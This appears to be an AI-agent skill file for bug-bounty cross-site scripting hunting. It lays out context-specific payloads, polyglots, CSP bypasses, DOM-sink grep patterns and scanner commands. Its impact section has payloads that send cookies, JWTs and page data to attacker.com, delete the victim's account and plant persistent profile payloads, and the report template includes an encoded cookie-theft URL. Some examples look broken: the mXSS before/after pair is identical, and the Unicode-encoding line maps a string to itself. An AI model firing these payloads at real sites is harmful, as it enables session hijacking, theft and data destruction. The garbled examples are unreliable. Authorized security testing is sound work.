---
name: xss
description: Hunt reflected, stored, and DOM-based Cross-Site Scripting (XSS) including CSP bypass, polyglot payloads, mutation XSS (mXSS), markdown XSS, and template XSS. Use when the user has identified a parameter or input that reflects to the page, or wants to test for XSS in a specific input.
metadata:
  type: skill
  phase: hunt
  vuln_class: xss
  cwe: 79
  tools: [dalfox, XSStrike, kxss, gxss, knoxss]
---

# XSS Hunting

> Self-XSS = N/A. Reflected with steal-cookie PoC = $$$. Stored = $$$$.

## When to invoke

**Trigger phrases:**
- "test XSS"
- "find XSS"
- "CSP bypass"
- "is this reflected XSS"
- "input X reflects"

## XSS taxonomy & payout

| Type | Description | Typical bounty |
|---|---|---|
| Self-XSS | Only attacker can trigger | N/A — don't submit |
| Reflected XSS (no impact) | Body reflects, but trivial popup | $50-300 (often N/A) |
| Reflected XSS (cookie steal) | Triggers, reads cookies | $300-1.5k |
| Reflected XSS chained to ATO | Steal session → full takeover | $2k-10k |
| Stored XSS (low-priv view) | Other users see your payload | $500-2k |
| Stored XSS (admin view) | Admin views payload → admin takeover | $3k-15k |
| DOM XSS | Sink fed by `location.hash` etc | $300-2k |
| mXSS / mutation XSS | Sanitizer bypassed via DOM mutation | $1k-5k |
| CSP bypass + XSS | Required for impact in CSP'd apps | $1k-3k uplift |
| File-upload XSS (SVG, HTML upload) | XSS via uploaded file | $500-3k |

## Step-by-Step Workflow

### 1. Find reflection points

```bash
# Mine candidates from URLs
cat all-urls.txt | grep -E '\?[a-zA-Z_]+=' | qsreplace 'BBARSENAL_REFLECT_TEST' | \
    while read url; do
        curl -s "$url" | grep -q 'BBARSENAL_REFLECT_TEST' && echo "[REFLECT] $url"
    done > reflective.txt

# Or use kxss (Go tool, fast)
cat all-urls.txt | kxss > kxss-output.txt
# kxss output shows which chars are reflected & how (encoded, raw, etc.)
```

### 2. Test reflection context

For each reflective parameter, determine **where** the value lands:

| Context | Example | Required payload escape |
|---|---|---|
| HTML body | `<div>USER_INPUT</div>` | `<script>alert(1)</script>` |
| HTML attribute (double quote) | `<input value="USER_INPUT">` | `"><script>alert(1)</script>` |
| HTML attribute (single quote) | `<input value='USER_INPUT'>` | `'><script>alert(1)</script>` |
| HTML attribute (unquoted) | `<input value=USER_INPUT>` | ` autofocus onfocus=alert(1)` |
| JavaScript string | `var x = "USER_INPUT";` | `";alert(1)//` |
| JavaScript context (unescaped) | `var x = USER_INPUT;` | `alert(1)` |
| URL (href, src) | `<a href="USER_INPUT">` | `javascript:alert(1)` |
| Style attribute | `style="background: USER_INPUT;"` | `red;background:url('javascript:alert(1)')` |
| `<title>` | `<title>USER_INPUT</title>` | `</title><script>alert(1)</script>` |
| `<textarea>` | `<textarea>USER_INPUT</textarea>` | `</textarea><script>alert(1)</script>` |
| `<noscript>` | `<noscript>USER_INPUT</noscript>` | requires user without JS or chain |
| Comment | `<!-- USER_INPUT -->` | `--><script>alert(1)</script>` |

### 3. Throw payload sets

**Discovery payload (canary):**
```
'"><img src=x onerror=alert(1)>
```

This polyglot probes:
- Single-quote escape
- Double-quote escape
- HTML tag inject
- Event handler execution

**If the canary doesn't fire, narrow:**

```bash
# Test with dalfox (the gold standard for automated XSS)
dalfox url "https://target.com/search?q=test" --waf-evasion --mining-dom --skip-bav

# Bulk
cat reflective.txt | dalfox pipe --silence --waf-evasion --skip-bav -o xss-results.txt
```

### 4. CSP bypass (if blocked)

Check CSP:
```bash
curl -sI "https://target.com" | grep -i content-security-policy
```

Common bypassable CSPs:
```
# Bypass 1: jsonp endpoints on whitelisted domain
Content-Security-Policy: script-src 'self' https://accounts.google.com;
→ <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert"></script>

# Bypass 2: 'unsafe-eval' allows function() / eval / setTimeout(string)
→ <img src=x onerror="setTimeout`alert\x281\x29`">

# Bypass 3: 'unsafe-inline' allows <script>alert(1)</script>
→ trivial

# Bypass 4: angularJS payload (if AngularJS on page + unsafe-eval)
→ {{constructor.constructor('alert(1)')()}}

# Bypass 5: base-uri not restricted + script-src 'self'
→ <base href="https://attacker.com/"><script src="x.js"></script>

# Bypass 6: dangling markup (if no script needed)
→ <img src='https://attacker.com/log?cookie=`document.cookie`
```

Use `csp-evaluator.withgoogle.com` for analysis.

### 5. Polyglot payloads (when context is unknown)

```html
<!-- Universal-ish polyglot -->
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(1)//'>

<!-- Compact universal -->
"><svg onload=alert(1)>

<!-- For attribute contexts -->
"autofocus onfocus=alert(1) x="

<!-- For JavaScript string contexts -->
';alert(1)//

<!-- For URL/href -->
javascript:alert(1)

<!-- For onload/onerror with no quotes (some encoders strip quotes) -->
javascript:eval(atob('YWxlcnQoMSk='))

<!-- DOM context (when innerHTML is the sink) -->
<img src/onerror=alert(1)>

<!-- For markdown XSS -->
[XSS](javascript:alert(1))
[XSS](javascript&colon;alert(1))
![XSS](javascript:alert(1))
<a href="j&#x61;vascript:alert(1)">XSS</a>
```

See `arsenal/xss-payloads/` for the curated set.

### 6. DOM XSS hunting

```bash
# Static analysis for DOM sinks in JS
grep -hE 'innerHTML|outerHTML|document\.write|eval\(|setTimeout\([\\\"\\\']|setInterval\([\\\"\\\']|Function\(|location\.[a-z]+\s*=|window\.name|postMessage' loot/target/js/files/*.js
```

DOM XSS sinks → sources flow analysis:

| Sink | Source | Payload |
|---|---|---|
| `document.write(x)` | `location.hash` | `#<img src=x onerror=alert(1)>` |
| `eval(x)` | `location.search` | `?x=alert(1)` |
| `innerHTML = x` | `localStorage.getItem('foo')` | inject via localStorage write |
| `location.href = x` | `window.name` | `window.name = "javascript:alert(1)"` |
| `postMessage` listener | malicious `postMessage` | run with attacker page open |

### 7. Stored XSS

Test every place data is **stored and rendered to another user**:
- Display name / username
- Profile bio / description
- Comments / posts / messages
- File names (uploaded files)
- File contents (SVG, HTML files)
- Address fields
- Custom fields (settings, integrations)
- Webhook URLs (rendered in admin panel)
- Support ticket / contact form (admin reads it)
- Markdown editors (preview vs render)
- Rich text editor outputs

**Common stored XSS goldmines:**
- SVG upload → `<svg onload=alert(1)>` (set Content-Type: image/svg+xml)
- Markdown editors that don't sanitize HTML
- "View as customer" / "Impersonate" admin features (admin views user content)

### 8. mXSS (mutation XSS)

When the app sanitizes input but the browser **rewrites** during DOM insertion:

```html
<!-- DOMPurify pre-Element-internal handling bypass: -->
<img src="x" onerror="alert(1)">
<!-- After insertion, browser may rewrite to: -->
<img src="x" onerror="alert(1)">    ← no change ↑
<!-- vs mXSS via SVG <math> namespaces -->
<svg><style><img src=x onerror=alert(1)>
```

Test with `<style>` / `<math>` / `<svg>` containers — they have special parsing rules.

### 9. XSStrike (alternative scanner)

```bash
# More aggressive than dalfox
python3 ~/tools/XSStrike/xsstrike.py -u "https://target.com/search?q=test" --fuzzer --crawl
```

## Impact framing

To turn a popup into bounty:

### Always include in PoC:
1. **Cookie theft** if `HttpOnly` is NOT set:
   ```html
   <img src=x onerror="new Image().src='https://attacker.com/?c='+encodeURIComponent(document.cookie)">
   ```
2. **Token/session theft** from localStorage:
   ```html
   <img src=x onerror="fetch('https://attacker.com/?t='+localStorage.getItem('jwt'))">
   ```
3. **CSRF token theft** from form / meta:
   ```html
   <img src=x onerror="fetch('/api/me').then(r=>r.text()).then(t=>fetch('https://attacker.com/?d='+btoa(t)))">
   ```
4. **State-changing action**:
   ```html
   <img src=x onerror="fetch('/api/v3/account/delete',{method:'POST',credentials:'include'})">
   ```
5. **Persistent XSS** via account modification (changes user profile to keep payload):
   ```js
   fetch('/api/v3/profile', {
     method: 'PATCH',
     credentials: 'include',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify({bio: '<img src=x onerror=...>'})
   })
   ```

## Output template

```markdown
## Reflected XSS in search parameter

**URL:** https://app.target.com/search?q=PAYLOAD
**Vulnerable parameter:** `q`
**Reflection context:** HTML body, inside `<div class="search-results">`

**PoC URL (popup):**
```
https://app.target.com/search?q=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
```

**PoC for cookie theft (impact escalation):**
```
https://app.target.com/search?q=%22%3E%3Cimg%20src%3Dx%20onerror%3D%22new%20Image().src%3D%27https%3A%2F%2Fattacker.com%2F%3Fc%3D%27%2BencodeURIComponent(document.cookie)%22%3E
```

**Cookie analysis:**
- `session_token` is NOT `HttpOnly` ← critical for impact
- `Secure` flag set
- `SameSite=Lax` ← link click works fine

**Impact:**
- Cookie steal → session hijack → full ATO of victim
- One-click attack: victim opens crafted link → session token sent to attacker
- Affects all users using the search feature

**Reproduction:**
1. Open crafted URL in any browser (logged in)
2. JavaScript executes
3. `document.cookie` is sent to attacker server
4. Attacker replays cookie in their browser → logged in as victim

**Suggested fix:**
1. Server-side output encoding on `q` parameter
2. Add `HttpOnly` to `session_token`
3. Add CSP header restricting inline scripts
```

## Cross-references

- `[[content-discovery]]` — finds parameters
- `[[js-analysis]]` — finds DOM sinks
- `[[ato-chains]]` — XSS → ATO chain
- `[[file-upload]]` — SVG / HTML upload XSS
- `[[oauth-oidc]]` — XSS on OAuth callback

## Common pitfalls

1. **Reporting `alert(1)` PoC alone.** Always include impact (cookie steal, ATO chain).
2. **Self-XSS.** If only attacker can trigger their own XSS → N/A.
3. **XSS on logout page.** Often "out of scope" or low impact.
4. **CSP-blocked XSS.** Show working bypass or chain.
5. **Not testing in latest Chrome.** Some payloads work in FF but fail in modern Chrome.

## Always-rejected XSS variants

- Self-XSS only
- XSS requiring browser extension
- XSS via header injection that needs MITM
- XSS in logout / 404 pages with no impact
- Theoretical XSS without working PoC

## kxss output cheatsheet

kxss tells you which special chars are reflected:
```
URL: https://target.com/search?q=test
Unfiltered: [", <, >, ', `, }, {]
```
If `<`, `>`, `"` all unfiltered → easy XSS. If only `"`, attribute-context XSS only.

## Encoding cheatsheet (for bypass)

```
<  →  %3C  &lt;  &#x3c;  &#60;  &LT;
>  →  %3E  &gt;  &#x3e;  &#62;  &GT;
"  →  %22  &quot;  &#x22;  &#34;
'  →  %27  &apos;  &#x27;  &#39;
(  →  %28  &lpar;  &#x28;  &#40;
)  →  %29  &rpar;  &#x29;  &#41;
/  →  %2F  &sol;  &#x2f;  &#47;

# Double encode for filters that decode once
<  →  %253C

# Unicode encoding (some parsers accept)
<script>  →  <script>
```
